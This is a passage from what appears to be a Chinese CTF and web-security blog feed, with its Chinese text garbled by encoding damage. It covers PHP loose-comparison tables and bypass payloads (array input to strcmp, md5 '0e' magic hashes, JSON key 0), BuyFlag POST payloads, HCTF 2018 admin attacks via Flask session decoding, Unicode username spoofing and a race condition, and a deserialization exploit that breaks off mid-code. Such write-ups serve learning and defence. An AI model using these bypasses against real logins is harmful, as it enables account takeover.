alse</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>-1</code></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"1"</code></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"0"</code></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"-1"</code></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><strong><code>null</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>array()</code></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"php"</code></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>""</code></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td></tr></tbody></table><h3 id="ä¸¥æ ¼æ¯”è¾ƒ"><a href="#ä¸¥æ ¼æ¯”è¾ƒ" class="headerlink" title="ä¸¥æ ¼æ¯”è¾ƒ ==="></a><strong>ä¸¥æ ¼æ¯”è¾ƒ <code>===</code></strong></h3><table><thead><tr><th></th><th><strong><code>true</code></strong></th><th><strong><code>false</code></strong></th><th><code>1</code></th><th><code>0</code></th><th><code>-1</code></th><th><code>"1"</code></th><th><code>"0"</code></th><th><code>"-1"</code></th><th><strong><code>null</code></strong></th><th><code>array()</code></th><th><code>"php"</code></th><th><code>""</code></th></tr></thead><tbody><tr><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>1</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>0</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>-1</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"1"</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"0"</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"-1"</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><strong><code>null</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>array()</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>"php"</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>""</code></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td></tr></tbody></table><h2 id="0x02-â€array-searchâ€ä¸Žis-arrayâ€ç»•è¿‡"><a href="#0x02-â€array-searchâ€ä¸Žis-arrayâ€ç»•è¿‡" class="headerlink" title="0x02:â€array_searchâ€ä¸Žis_arrayâ€ç»•è¿‡"></a>0x02:â€array_searchâ€ä¸Žis_arrayâ€ç»•è¿‡</h2><p>is_array:åˆ¤æ–­ä¼ å…¥çš„æ˜¯ä¸æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œarray_searchï¼ˆxï¼Œ$æ•°ç»„ï¼‰:åœ¨æ•°ç»„ä¸­å¯»æ‰¾ä¸ŽæŒ‡å®šå€¼(x)ç›¸ç­‰çš„å€¼ï¼Œarray_searchå‡½æ•° ç±»ä¼¼äºŽâ€==â€ï¼Œä¼šè¿›è¡Œç±»åž‹çš„è½¬æ¢</p><pre><code>&lt;?phpif(!is_array($_GET['test'])){exit();}$test=$_GET['test'];for($i=0;$i&lt;count($test);$i++){    if($test[$i]==="admin"){        echo "error";        exit();    }    $test[$i]=intval($test[$i]);}if(array_search("admin",$test)===0){    echo "flag";}else{    echo "false";}?&gt;</code></pre><p>åœ¨ä¸Šé¢çš„æ —å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥test[]=0æ¥è¿›è¡Œç»•è¿‡ï¼Œé¦–å…ˆtestæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç¬¦åˆis_arrayçš„åˆ¤æ–­ï¼Œç„¶åŽtest=0ï¼›åœ¨array_searchä¸­0==adminä¸ºtrueï¼Œç»•è¿‡äº†array_searchã€‚</p><h2 id="0x03ï¼šstrcmpæ¼æ´žç»•è¿‡"><a href="#0x03ï¼šstrcmpæ¼æ´žç»•è¿‡" class="headerlink" title="0x03ï¼šstrcmpæ¼æ´žç»•è¿‡"></a>0x03ï¼šstrcmpæ¼æ´žç»•è¿‡</h2><p>strcmpæ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œstr1&lt;str2ï¼Œè¿”å›ž&lt;0ï¼Œstr1&gt;str2,è¿”å›ž&gt;0,ç›¸ç­‰æ—¶è¿”å›žç­‰äºŽ0</p><pre><code>&lt;?php    $password="***************"     if(isset($_POST['password'])){     if (strcmp($_POST['password'], $password) == 0) {           echo "Right!!!login success";n           exit();       } else {           echo "Wrong password..";              }?&gt;</code></pre><p>ä¸Šè¿°ä»£ç ä¸­è¦æ±‚æˆ‘ä»¬postä¸€ä¸ªpasswordå€¼ï¼Œè¦ä¸Žç»™å®šçš„passwordå˜é‡çš„å€¼ç›¸ç­‰ï¼Œä½†æˆ‘ä»¬ä¸çŸ¥é“passwordå˜é‡çš„å€¼æ˜¯ä»€ä¹ˆï¼è¿™æ€Žä¹ˆåŠžå‘¢ï¼Ÿ<br>stampæœŸæœ›ä¼ å…¥çš„å€¼æ˜¯å­—ç¬¦ä¸²ç±»åž‹ï¼Œä½†å¦‚æžœæˆ‘ä»¬ä¼ å…¥æ•°ç»„ç±»åž‹ä¼šæ€Žä¹ˆæ ·å‘¢ï¼Ÿ<br>æˆ‘ä»¬ä¼ å…¥ password[]=xxx å¯ä»¥ç»•è¿‡ æ˜¯å› ä¸ºå‡½æ•°æŽ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»åž‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯åˆ¤æ–­å…¶ç›¸ç­‰</p><h2 id="0x04ï¼šmd5ç»•è¿‡-Hashæ¯”è¾ƒç¼ºé™·"><a href="#0x04ï¼šmd5ç»•è¿‡-Hashæ¯”è¾ƒç¼ºé™·" class="headerlink" title="0x04ï¼šmd5ç»•è¿‡(Hashæ¯”è¾ƒç¼ºé™·)"></a>0x04ï¼šmd5ç»•è¿‡(Hashæ¯”è¾ƒç¼ºé™·)</h2><pre><code>&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) {    $logined = true;    $Username = $_GET['Username'];    $password = $_GET['password'];     if (!ctype_alpha($Username)) {$logined = false;}     if (!is_numeric($password) ) {$logined = false;}     if (md5($Username) != md5($password)) {$logined = false;}     if ($logined){    echo "successful";      }else{           echo "login failed!";        }    }?&gt;    </code></pre><p>é¢˜ç›®å¤§æ„æ˜¯è¦è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•°å­—ç±»åž‹ï¼Œå¹¶ä¸”ä»–ä»¬çš„md5å€¼ç›¸ç­‰ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œä¸‹ä¸€æ­¥è¯­å¥ </p><p>ä»‹ç»ä¸€æ‰¹md5å¼€å¤´æ˜¯0eçš„å­—ç¬¦ä¸² ä¸Šæ–‡æåˆ°è¿‡ï¼Œ<strong>0eåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥æ— è®º0eåŽé¢æ˜¯ä»€ä¹ˆï¼Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0</strong>ã€‚**md5(â€˜240610708â€™) == md5(â€˜QNKCDZOâ€™)**æˆåŠŸç»•è¿‡!</p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514</code></pre><h2 id="0x05ï¼šjsonç»•è¿‡"><a href="#0x05ï¼šjsonç»•è¿‡" class="headerlink" title="0x05ï¼šjsonç»•è¿‡"></a>0x05ï¼šjsonç»•è¿‡</h2><pre><code>&lt;?phpif (isset($_POST['message'])) {    $message = json_decode($_POST['message']);    $key ="*********";    if ($message-&gt;key == $key) {        echo "flag";    }     else {        echo "fail";    } } else{     echo "~~~~"; }?&gt;</code></pre><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="å¤åˆ¶ä»£ç "></a></p><p>è¾“å…¥ä¸€ä¸ªjsonç±»åž‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äºŽ $keyçš„å€¼ï¼Œä½†æ˜¯$keyçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œ<strong>ä½†æ˜¯å¯ä»¥åˆ©ç”¨0==â€adminâ€è¿™ç§å½¢å¼ç»•è¿‡</strong></p><p><strong>æœ€ç»ˆpayload message={â€œkeyâ€:0}</strong></p><h2 id="0x06ï¼šswitchç»•è¿‡"><a href="#0x06ï¼šswitchç»•è¿‡" class="headerlink" title="0x06ï¼šswitchç»•è¿‡"></a>0x06ï¼šswitchç»•è¿‡</h2><pre><code>&lt;?php$a="4admin";switch ($a) {    case 1:        echo "fail1";        break;    case 2:        echo "fail2";        break;    case 3:       echo "fail3";       break;    case 4:        echo "sucess";  //ç»“æžœè¾“å‡ºsuccess;        break;    default:        echo "failall";        break;}?&gt;</code></pre><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/liangshian/p/10925792.html">https://www.cnblogs.com/liangshian/p/10925792.html</a></p><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æžå®¢å¤§æŒ‘æˆ˜:2019-BuyFlag</title>
      <link href="2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/"/>
      <url>2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223645887.png" alt="image-20210614223645887"></p><p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223700776.png" alt="image-20210614223700776"></p><p>ç‚¹å‡»menuçœ‹åˆ°è¿™ä¸ªï¼š</p><p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223729634.png" alt="image-20210614223729634"></p><p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614224001121.png" alt="image-20210614224001121"></p><p>æŸ¥çœ‹æºç ï¼š</p><pre><code>    ~~~post money and password~~~if (isset($_POST['password'])) {    $password = $_POST['password'];    if (is_numeric($password)) {        echo "password can't be number&lt;/br&gt;";    }elseif ($password == 404) {        echo "Password Right!&lt;/br&gt;";    }}</code></pre><p>æ‰€ä»¥è¦postï¼šmoney=100000000å’Œpassword=404ä½†æ˜¯passwordä¸èƒ½ä¸ºæ•°å­—</p><p>åº”ç”¨åˆ°PHPå¼±ç±»åž‹ï¼š</p><pre><code>money=100000000&amp;password=404a</code></pre><p>é•¿åº¦è¶…äº†</p><pre><code>money=1e10&amp;password=404a</code></pre><pre><code>money[]=100000000&amp;password=404a</code></pre><p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614232002000.png" alt="image-20210614232002000"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHPå¼±ç±»åž‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF:2018-admin</title>
      <link href="2021/06/12/hctf-2018-admin/"/>
      <url>2021/06/12/hctf-2018-admin/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/12/hctf-2018-admin/image-20210612203007320.png" alt="image-20210612203007320"></p><p>åœ¨changepassword</p><p><img src="/2021/06/12/hctf-2018-admin/image-20210612203245969.png" alt="image-20210612203245969"></p><p>è®¿é—®ç”¨flaskå†™çš„</p><pre><code>@app.route('/code')def get_code():@app.route('/index')def index():@app.route('/register', methods = ['GET', 'POST'])def register():@app.route('/login', methods = ['GET', 'POST'])def login():@app.route('/logout')def logout():@app.route('/change', methods = ['GET', 'POST'])def change():@app.route('/edit', methods = ['GET', 'POST'])def edit():</code></pre><h2 id="æ³•ä¸€ï¼šflask-sessionä¼ªé€ "><a href="#æ³•ä¸€ï¼šflask-sessionä¼ªé€ " class="headerlink" title="æ³•ä¸€ï¼šflask sessionä¼ªé€ "></a>æ³•ä¸€ï¼šflask sessionä¼ªé€ </h2><p>æœ¬åœ°è„šæœ¬è§£å¯†</p><pre><code>#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b'.', 1)    payload, timestamp = payload.rsplit(b'.', 1)    decompress = False    if payload.startswith(b'.'):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception('Could not base64 decode the payload because of '                         'an exception')    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception('Could not zlib decompress the payload before '                             'decoding the payload')    return session_json_serializer.loads(payload)if __name__ == '__main__':    print(decryption(sys.argv[1].encode()))</code></pre><pre class=" language-python"><code class="language-python">SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">'ckj123'</span></code></pre><p>ç„¶åŽåœ¨index.htmlé¡µé¢å‘çŽ°åªè¦session[â€˜nameâ€™] == â€˜adminâ€™å³å¯ä»¥å¾—åˆ°flag</p><h2 id="æ³•äºŒï¼šUnicodeæ¬ºéª—"><a href="#æ³•äºŒï¼šUnicodeæ¬ºéª—" class="headerlink" title="æ³•äºŒï¼šUnicodeæ¬ºéª—"></a>æ³•äºŒï¼šUnicodeæ¬ºéª—</h2><p>ä»”ç»†è§‚å¯Ÿè·¯ç”±å‘çŽ°åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™å…ˆå°†nameè½¬æˆå°å†™ï¼Œéš¾é“æ˜¯ç™»é™†æ³¨å†Œçš„æ—¶å€™æ²¡æœ‰è½¬å—ï¼Ÿ<br><img src="https://img-blog.csdnimg.cn/20190911131540626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›ä¸€ä¸‹registerã€login</p><p><img src="https://img-blog.csdnimg.cn/20190911131548384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="img"></p><p>å‘çŽ°éƒ½ç”¨strlower()æ¥è½¬å°å†™ï¼Œä½†æ˜¯pythonä¸­å·²ç»è‡ªå¸¦è½¬å°å†™å‡½æ•°lower()ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„ï¼Œè·Ÿè¿›ä¸€ä¸‹strlowerå‡½æ•°</p><pre><code>def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>è¿™é‡Œç”¨çš„nodeprep.prepareå‡½æ•°ï¼Œè€Œnodeprepæ˜¯ä»ŽTwistedæ¨¡å—å¯¼å…¥çš„ï¼Œåœ¨requirements.txtæ–‡ä»¶ä¸­å‘çŽ°Twisted==10.2.0ï¼Œè€Œå®˜ç½‘æœ€æ–°å·²ç»åˆ°äº†19.7.0(2019/9)ï¼Œç‰ˆæœ¬å·®è·å¾ˆå¤§ï¼Œåº”è¯¥ä¼šå­˜åœ¨æ¼æ´žã€‚</p><p>å…³äºŽUnicodeé—®é¢˜å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/">https://panda1g1.github.io/2018/11/15/HCTF%20admin/</a></p><p>å…³äºŽå…·ä½“ç¼–ç å¯æŸ¥ <a href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a> ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å¤åˆ¶è¿‡åŽç”¨ç«™é•¿å·¥å…·è½¬æ¢æˆUnicodeç¼–ç ã€‚<br><img src="https://img-blog.csdnimg.cn/20190911131601586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åŽæˆ‘ä»¬å‘çŽ°åœ¨ä½¿ç”¨nodeprep.prepareå‡½æ•°è½¬æ¢æ—¶è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>á´¬á´°á´¹á´µá´º -&gt; ADMIN -&gt; admin</p><p>å‡å¦‚æˆ‘ä»¬æ³¨å†Œá´¬á´°á´¹á´µá´ºç”¨æˆ·ï¼Œç„¶åŽåœ¨ç”¨á´¬á´°á´¹á´µá´ºç”¨æˆ·ç™»å½•ï¼Œå› ä¸ºåœ¨loginå‡½æ•°é‡Œä½¿ç”¨äº†ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ç™»å½•ä¸ŠåŽ»çœ‹åˆ°çš„ç”¨æˆ·åä¸ºADMINï¼Œæ­¤æ—¶æˆ‘ä»¬å†ä¿®æ”¹å¯†ç ï¼Œåˆè°ƒç”¨äº†ä¸€æ¬¡nodeprep.prepareå‡½æ•°å°†nameè½¬æ¢ä¸ºadminï¼Œç„¶åŽæˆ‘ä»¬å°±å¯ä»¥æ”¹æŽ‰adminçš„å¯†ç ï¼Œæœ€åŽåˆ©ç”¨adminè´¦å·ç™»å½•å³å¯æ‹¿åˆ°flagã€‚</p><h2 id="æ³•ä¸‰ï¼šæ¡ä»¶ç«žäº‰"><a href="#æ³•ä¸‰ï¼šæ¡ä»¶ç«žäº‰" class="headerlink" title="æ³•ä¸‰ï¼šæ¡ä»¶ç«žäº‰"></a>æ³•ä¸‰ï¼šæ¡ä»¶ç«žäº‰</h2><p><img src="https://img-blog.csdnimg.cn/20190911131634134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥(img-nsi0LaO3-1568178828389)(/images/HCTF2018-admin/12.png)]"></p><p>åœ¨sessionèµ‹å€¼æ—¶ï¼Œç™»å½•ã€æ³¨å†Œéƒ½æ˜¯ç›´æŽ¥è¿›è¡Œèµ‹å€¼ï¼Œæœªè¿›è¡Œå®‰å…¨éªŒè¯ï¼Œä¹Ÿå°±å¯èƒ½å­˜åœ¨ä»¥ä¸‹ä¸€ç§å¯èƒ½ï¼š<br>æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·testï¼ŒçŽ°åœ¨æœ‰ä¸€ä¸ªè¿›ç¨‹1ä¸€ç›´é‡å¤è¿›è¡Œç™»å½•ã€æ”¹å¯†ç æ“ä½œï¼Œè¿›ç¨‹2ä¸€ç›´æ³¨é”€ï¼Œä¸”ä»¥adminç”¨æˆ·å’Œè¿›ç¨‹1æ‰€æ”¹çš„å¯†ç è¿›è¡Œç™»å½•ï¼Œæ˜¯ä¸æ˜¯æœ‰å¯èƒ½å½“è¿›ç¨‹1è¿›è¡Œåˆ°æ”¹å¯†ç æ“ä½œæ—¶ï¼Œè¿›ç¨‹2æ°å¥½æ³¨é”€ä¸”è¦è¿›è¡Œç™»å½•ï¼Œæ­¤æ—¶è¿›ç¨‹1æ”¹å¯†ç éœ€è¦ä¸€ä¸ªsessionï¼Œè€Œè¿›ç¨‹2åˆšå¥½å°†session[â€˜nameâ€™]èµ‹å€¼ä¸ºadminï¼Œç„¶åŽè¿›ç¨‹1è°ƒç”¨æ­¤sessionä¿®æ”¹å¯†ç ï¼Œå³ä¿®æ”¹äº†adminçš„å¯†ç ã€‚</p><p>åŽŸæ–‡é“¾æŽ¥ï¼š<a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾å®‰å…¨</title>
      <link href="2021/06/12/qu-kuai-lian-an-quan/"/>
      <url>2021/06/12/qu-kuai-lian-an-quan/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æžå®¢å¤§æŒ‘æˆ˜:2019-PHP</title>
      <link href="2021/06/11/ji-ke-da-tiao-zhan-2019-php/"/>
      <url>2021/06/11/ji-ke-da-tiao-zhan-2019-php/</url>
      
        <content type="html"><![CDATA[<p>dirsearchæ‰«æä¸‹è½½<a href="http://www.zip/">www.zip</a></p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre><code> &lt;?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?&gt;</code></pre><h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre><code>&lt;?phpinclude 'flag.php';error_reporting(0);class Name{    private $username = 'nonono';    private $password = 'yesyes';    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = 'guest';    }    function __destruct(){        if ($this-&gt;password != 100) {            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";            echo "You name is: ";            echo $this-&gt;username;echo "&lt;/br&gt;";            echo "You password is: ";            echo $this-&gt;password;echo "&lt;/br&gt;";            die();        }        if ($this-&gt;username === 'admin') {            global $flag;            echo $flag;        }else{            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";            die();        }    }}?&gt;</code></pre><p>ç”¨æˆ·åä¸ºadminï¼Œå¯†ç ä¸º100åˆ™å¯ä»¥è¾“å‡ºflag</p><pre><code>&lt;?phpclass Name{    private $username = 'admin';    private $password = '100';}$a = new Name();echo 